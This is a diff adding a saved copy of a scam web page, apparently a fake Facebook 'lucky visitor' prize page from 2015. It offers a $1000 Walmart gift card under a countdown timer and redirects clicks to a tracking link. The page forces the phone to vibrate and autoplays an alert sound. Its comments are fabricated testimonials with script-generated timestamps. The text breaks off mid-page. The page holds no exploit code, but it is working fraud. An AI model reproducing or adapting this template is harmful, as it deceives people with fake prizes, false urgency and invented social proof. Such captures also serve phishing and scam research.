@@ -1,0 +1,349 @@
+<html xmlns="http://www.w3.org/1999/xhtml" webdriver="true">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<!-- Original URL: http://facebook.com-winner.me/US/
+Date Downloaded: 2015-12-11 7:32:24 PM !-->
+
+<meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Congrats!</title>
+<script type="text/javascript">
+var vid2="E3QGrGdLfGoubKoUsAM-byPSZFA-WVO9XCQJuFX2c04q9CaKbzQAayYdcK7Qo3JpiJa3r25Zo";
+var href="http://spnccrzone.com/?oex3=voNayBvXhoMtoyywLnck%2boPjtpcV%2bi7m&s1=14a84a84f36a84f36&s5=&s2=YJRRIILGGHLOvKPFBHjWBefZrmNc0VSF1iO-fm0E-IgC-K%3DEyJLHg&s3=nj7Yd&s4=";
+    function GetTimeWithAMPM(nHour,num,nMinute)
+    {
+		if(nHour< num ){
+    		nHour = nHour;
+        }else{
+        	nHour = nHour-num;
+        }
+        var AMPM = "am";
+        if (nHour >= 12)
+        {
+            AMPM = "pm";
+            nHour = nHour - 12;
+        }
+        if (nHour == 0)
+            nHour = 0;
+ 
+        if (nHour < 10)
+            nHour = "0" + nHour;
+			
+        if (nMinute < 10)
+            nMinute = "0" + nMinute;
+            
+ 
+        return nHour + ":" + nMinute + " " + AMPM;
+    }
+</script>
+
+<!--
+<script type="text/javascript" src="images/sf_preloader.jsp"></script>
+<script src="images/pubjs" type="text/javascript" id="confsc"></script>
+<script src="images/facommon3.js" type="text/javascript" id="FACommonScript"></script>
+<script type="text/javascript" src="images/sf_code.jsp"></script>
+<script type="text/javascript" src="images/main.js"></script>
+<script type="text/javascript" src="images/main(1).js"></script>
+<script type="text/javascript" src="images/base_single_icon.js"></script>
+<script type="text/javascript" src="images/sf_allenby.js"></script>
+-->
+
+
+<script type="text/javascript">
+	navigator.vibrate = navigator.vibrate ||
+						navigator.webkitVibrate ||
+						navigator.mozVibrate || 
+						navigator.msVibrate;
+
+	navigator.vibrate([1000, 500, 1000, 500, 1000, 500]);
+	</script>
+<link rel="stylesheet" type="text/css" href="contentView/fb_walmart_us/static/index.css" media="all">
+</head>
+<body><audio autoplay="" preload="">
+  <source src="contentView/fb_walmart_us/static/alert.ogg" type="audio/ogg">
+  <source src="contentView/fb_walmart_us/static/alert.mp3" type="audio/mpeg">
+</audio>
+<a class="popunder">
+<div class="header"><table style="width: 97%;" border="0">
+<tbody><tr>
+  <td height="34" width="100%"><img src="contentView/fb_walmart_us/static/WechatIMG14.png" height="35" width="100%"></td>
+</tr>
+</tbody></table></div>
+<div class="container">
+  <div class="contestwrap">
+    <div class="toptext" style="font-size: small;">                                <table>
+  <tbody><tr>
+    <th valign="bottom"><b><font color="#3c599b">Congratulations, You're Today's Lucky Visitor!!</font></b></th>
+  </tr>
+  <tr>
+    <td valign="top" align="center"><font color="#9fa2a6" size="2px"><script>
+var mydate=new Date()
+mydate.setDate(mydate.getDate()-0);
+var year=mydate.getYear()
+if (year < 1000)
+year+=1900
+var day=mydate.getDay()
+var month=mydate.getMonth()
+var daym=mydate.getDate()
+if (daym<10)
+daym="0"+daym
+var dayarray=new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday")
+var montharray=new Array("January","February","March","April","May","June","July","August","September","October","November","December")
+document.write(""+montharray[month]+" "+daym+"")
+</script> at <script>
+    document.write(GetTimeWithAMPM(new Date().getHours(),0,new Date().getMinutes()));
+   hours = new Date().getHours();
+   str = "am";
+</script></font></td>
+  </tr>
+</tbody></table>
+<p>Every
+        <script language="Javascript">
+<!-- 
+// Array of day names
+var dayNames = new Array("Sunday","Monday","Tuesday","Wednesday",
+				"Thursday","Friday","Saturday");
+// Array of month Names
+var monthNames = new Array(
+"January","February","March","April","May","June","July",
+"August","September","October","November","December");
+var now = new Date();
+document.write(dayNames[now.getDay()]);
+// -->
+        </script> we select lucky <strong>Phone</strong> users from Jersey City to receive a special reward from our sponsors, as our<strong> "thank you"</strong> for being a loyal Phone customer.<br><br>
+     <strong>You are a lucky Phone  user! </strong>You can select any 1 of these $1000 gift cards!<br><br>
+    <strong>Note:</strong> Remaining stock is displayed in real-time, claimed gift cards will be taken down at any time so act fast.<br></p>
+   
+    </div>  
+
+    <div class="clear"></div>
+  </div>
+  </div></a>
+  <a class="popunder">
+    <div class="select">You have <font color="red"><b><span id="mins">1</span> minute and <span id="hsecs">40</span> seconds</b></font> to select a gift card below or your spot may be forfeited.</div>
+  </a>
+  <div class="content"  style="padding:0 8px">
+	 
+<!--A1-->
+<div class="item itemB" style="visibility: visible;">
+    <div class="left"><a target="_top" href="http://spnccrzone.com/?oex3=voNayBvXhoMtoyywLnck%2boPjtpcV%2bi7m&s1=14a84a84f36a84f36&s5=&s2=YJRRIILGGHLOvKPFBHjWBefZrmNc0VSF1iO-fm0E-IgC-K%3DEyJLHg&s3=nj7Yd&s4=2" onclick="exit_b1(2);PreventExitPop=false"><img src="contentView/fb_walmart_us/static/WechatIMG9.jpeg" class="img" ></a>
+    
+    
+        <div class="clear"></div>
+        <div class="lightblue2">Limited Quantity</div>
+      </div>
+      <div class="right">        <div class="track"><a target="_top" onclick="exit_b1(3);PreventExitPop=false" href="http://spnccrzone.com/?oex3=voNayBvXhoMtoyywLnck%2boPjtpcV%2bi7m&s1=14a84a84f36a84f36&s5=&s2=YJRRIILGGHLOvKPFBHjWBefZrmNc0VSF1iO-fm0E-IgC-K%3DEyJLHg&s3=nj7Yd&s4=3">Walmart Gift Card</a></div>        <div class="secondary">
+
+          <div class="rating">Redeemable online and in-stores</div>
+        </div>  
+        <div class="secondary">
+          <div class="rating"><span class="lightblue">Value: $1000</span></div>
+        </div>
+        <div class="secondary">
+          
+        </div>
+        <div class="clear"></div>
+        <div><a target="_top" class="myButton" href="http://spnccrzone.com/?oex3=voNayBvXhoMtoyywLnck%2boPjtpcV%2bi7m&s1=14a84a84f36a84f36&s5=&s2=YJRRIILGGHLOvKPFBHjWBefZrmNc0VSF1iO-fm0E-IgC-K%3DEyJLHg&s3=nj7Yd&s4=1" onclick="exit_b1(1);PreventExitPop=false">SELECT</a></div>
+      </div>
+      <div class="clear"></div>
+    </div>
+
+
+    <div class="item">
+      <div class="left"><a href="javascript:alert('SORRY,GIFT GARD IS OUT OF SROCK! \n Please choose another prize.')"><img src="contentView/fb_walmart_us/static/WechatIMG8.jpeg" class="img" ></a>
+        <div class="clear"></div>
+        <div class="lightblue2">Not Available</div>
+      </div>
+      <div class="right">
+        <div class="track"><a href="javascript:alert('SORRY,GIFT GARD IS OUT OF SROCK! \n Please choose another prize.')">Visa Gift Card</a></div>        
+        <div class="secondary">
+          <div class="rating">Redeemable online and in-stores</div>
+        </div>  
+        <div class="secondary">
+          <div class="rating"><span class="lightblue">Value: $1000</span></div>
+        </div>
+        
+        <div class="secondary">
+          
+        </div>
+        <div class="clear"></div>
+        <div><a class="button1" href="javascript:alert('SORRY,GIFT GARD IS OUT OF SROCK! \n Please choose another prize.')"  >OUT OF STOCK</a></div>
+      </div>
+      <div class="clear"></div>
+    </div>
+
+   <div class="item">
+      <div class="left"><a target="_top" href="javascript:alert('SORRY,GIFT GARD IS OUT OF SROCK! \n Please choose another prize.')" ><img class="img" src="contentView/fb_walmart_us/static/WechatIMG11.jpeg"></a>
+        <div class="clear"></div>
+        <div class="lightblue2">Limited Quantity</div>
+      </div>
+      <div class="right">
+        <div class="track"><a target="_top" href="javascript:alert('SORRY,GIFT GARD IS OUT OF SROCK! \n Please choose another prize.')" >Amazon Gift Card</a></div>
+        <div class="secondary">
+          <div class="rating">Redeemable online and in-store</div>
+        </div>  
+        <div class="secondary">
+          <div class="rating"><span class="lightblue">Value: $1000</span></div>
+        </div>
+        <div class="secondary">
+                  </div>
+        <div class="clear"></div>
+        <div>
+          <a target="_top" href="javascript:alert('SORRY,GIFT GARD IS OUT OF SROCK! \n Please choose another prize.')" class="button1">OUT OF STOCK</a></div>
+      </div>
+      <div class="clear"></div>
+    </div>
+
+    
+  </div>            
+  <!--COMMENTS -->
+  <a class="popunder">
+  <div class="comments">	
+          	<font face="arial">
+       </font><center><font face="arial"><font color="000"><strong>COMMENTS</strong></font>
+		<table width="100%" cellspacing="0" cellpadding="4" border="0" style="padding-top: 10px; font-size: 13px;">	
+					<tbody>
+						<tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment-b.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Karen Greenwall</div>
+								<div style="padding-top: 5px;">
+									<font face="arial">My gift card took over 12 days to get to me!! But it came in a very cute box lol! :)
+									<br/>
+									<img src="contentView/fb_walmart_us/static/WechatIMG17.jpeg">
+								</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+								<script>document.write(""+daym+" "+montharray[month]+"")</script>
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),0,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>
+							</td>			
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>		
+						<tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment4.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Tim West</div>
+								<div style="padding-top: 5px;">Thought this was a joke at first,but my 
+									<font face="arial">Thought this was a joke at first, but my visa gift card actually came in the mail this morning #legit. Tried to claim it twice, but it didn't work lol</font> 
+									
+								</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+daym+" "+montharray[month]+"")</script> 
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),1,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>		
+							</td>	
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>	
+				        <tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment-e.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Charles Wong</div>
+								<div style="padding-top: 5px;">omg my friend said this was how he got his amazon gift card, but I didn't believe him. Just signed up. Will post back how it goes
+									<br/>
+									<img src="contentView/fb_walmart_us/static/WechatIMG18.jpeg">
+								</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+daym+" "+montharray[month]+"")</script>
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),2,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>		
+							</td>	
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>	
+				        <tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment7.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Naiomi Marie</div>
+								<div style="padding-top: 5px; color:#3b5998;">They ran out of Amazon gift cards so they sent me a Walmart one instead. Should have just sent a visa giftcard to make up for it...
+									
+									
+								</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+daym+" "+montharray[month]+"")</script> 
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),2,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>
+							</td>	
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>	
+				        <tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment-k.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Krissy Brooke</div>
+								<div style="padding-top: 5px;">Wasn't sure if this was legit or not but got my gift card today. Thanks guys!</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+daym+" "+montharray[month]+"")</script>
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),3,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>		
+							</td>	
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>				        
+						<tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment-c.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Lexi Benz</div>
+								<div style="padding-top: 5px;"><font face="arial">Damn I wanted the visa gift card! i don't even shop at walmart or amazon...
+									<br/>
+									<img src="contentView/fb_walmart_us/static/WechatIMG15.jpeg">
+									</font></div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>
+										if(hours>2)hours=hours-1;
+										document.write(""+daym+" "+montharray[month]+"")
+									</script> 
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),3,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>
+							</td>	
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>	
+						<tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment1.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Tobias Rafton</div>
+								<div style="padding-top: 5px;"><font face="arial">Omg I did't realize there was a timer! can I get another chance pleasee
+									<br/>
+									<img src="contentView/fb_walmart_us/static/rsz_1547628_1.png">
+									</font></div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+(daym-1)+" "+montharray[month]+"")</script>
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),1,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>				
+							</td>
+						</tr>
+						<tr><td colspan="2"><hr></td></tr>	
+						<tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/comment6.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">David Young</div>
+								<div style="padding-top: 5px;">this amazing! i never win anything before but today I am a lucky!! thank you Facebook!
+									
+									
+								</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+(daym-1)+" "+montharray[month]+"")</script>
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),2,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>				
+							</td>	
+						</tr>
+						
+						<tr><td colspan="2"><hr></td></tr>	
+						<tr>
+							<td width="50" valign="top" align="right"><img src="contentView/fb_walmart_us/static/9.jpg"></td>
+							<td valign="top" align="left">
+								<div style="font-weight: bold; color:#3b5998;">Li Chan Hun</div>
+								<div style="padding-top: 5px;">ave you ever seen this before, I ignored it because I thought it was a fake page. Now I've even tried it for myself and got it real!  COOL!
+									<br/>
+									<img src="contentView/fb_walmart_us/static/WechatIMG16.jpeg">
+									
+								</div>
+								<div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;">
+									<script>document.write(""+(daym-1)+" "+montharray[month]+"")</script> 
+									at <script type="text/javascript">document.write(GetTimeWithAMPM((new Date().getHours()),3,Math.ceil(Math.random()*(new Date().getMinutes()))));</script>
+								</div>				
+							</td>	
+						</tr>
+						
+						
+						<tr>
+							<td width="50" valign="top" align="right"> </td>
+							<td valign="top" align="center">
+								Submit your comment:<br/>
+								<textarea rows="3" cols="20">
